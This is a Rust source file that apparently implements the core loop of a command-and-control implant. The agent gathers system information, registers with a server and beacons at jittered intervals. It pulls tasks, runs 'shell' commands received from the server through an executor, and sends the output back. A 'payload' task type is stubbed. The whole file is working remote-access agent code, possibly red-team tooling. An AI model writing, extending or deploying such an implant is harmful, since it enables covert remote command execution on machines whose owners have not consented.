use std::time::Duration;

use rand::Rng;
use tracing::{debug, info, warn};

use crate::config::Config;
use crate::error::Error;
use crate::executor::CommandExecutor;
use crate::system_info::SystemInfo;
use crate::transport::{Task, Transport};

pub struct Agent<T: Transport, E: CommandExecutor> {
    config: Config,
    transport: T,
    executor: E,
    id: Option<String>,
}

impl<T: Transport, E: CommandExecutor> Agent<T, E> {
    pub fn new(
        config: Config,
        transport: T,
        executor: E,
    ) -> Self {
        Self {
            config,
            transport,
            executor,
            id: None,
        }
    }

    pub fn run(mut self) {
        self.register_with_retry();

        info!(
            id = %self.id.as_deref().unwrap_or("?"),
            "starting beacon loop"
        );

        loop {
            std::thread::sleep(self.next_sleep());
            self.beacon();
        }
    }

    fn register_with_retry(&mut self) {
        let info = SystemInfo::gather();

        loop {
            match self.transport.register(&info) {
                Ok(id) => {
                    info!(%id, "registered with server");
                    self.id = Some(id);
                    return;
                }

                Err(e) => {
                    warn!(
                        error = %e,
                        "registration failed, retrying"
                    );

                    std::thread::sleep(
                        self.config.retry_delay
                    );
                }
            }
        }
    }

    fn beacon(&self) {
        let id = match self.id.clone() {
            Some(id) => id,

            None => {
                warn!("not registered yet");
                return;
            }
        };

        let task = match self.transport.get_task(&id) {
            Ok(task) => task,

            Err(e) => {
                warn!(
                    error = %e,
                    "task check failed"
                );

                return;
            }
        };

        let output = self.dispatch_task(task);

        if let Err(e) =
            self.transport.send_result(&id, &output)
        {
            warn!(
                error = %e,
                "failed to send result"
            );
        }
    }

    fn dispatch_task(&self, task: Task) -> String {
        match task.task_type.as_str() {
            "shell" => {
                let command = match task.command {
                    Some(command) if !command.is_empty() => command,

                    _ => {
                        return "shell task has no command".into();
                    }
                };

                debug!(
                    command = %command,
                    "dispatching shell task"
                );

                match self.executor.execute(&command) {
                    Ok(output) => output,

                    Err(e) => {
                        format!("error: {e}")
                    }
                }
            }

            "payload" => {
                let payload_id =
                    task.payload_id
                        .unwrap_or_else(|| "unknown".into());

                debug!(
                    payload_id = %payload_id,
                    "payload task received"
                );

                format!(
                    "payload task received: {}",
                    payload_id
                )
            }

            other => {
                format!(
                    "unsupported task type: {}",
                    other
                )
            }
        }
    }

    fn next_sleep(&self) -> Duration {
        let jitter = self.config.jitter;

        if jitter <= 0.0 {
            return self.config.sleep;
        }

        let factor: f64 =
            rand::thread_rng().gen();

        apply_jitter(
            self.config.sleep,
            jitter,
            factor,
        )
    }
}

fn apply_jitter(
    base: Duration,
    jitter: f64,
    factor: f64,
) -> Duration {
    let multiplier =
        1.0
            - jitter
            + 2.0 * jitter * factor.clamp(0.0, 1.0);

    base.mul_f64(multiplier)
}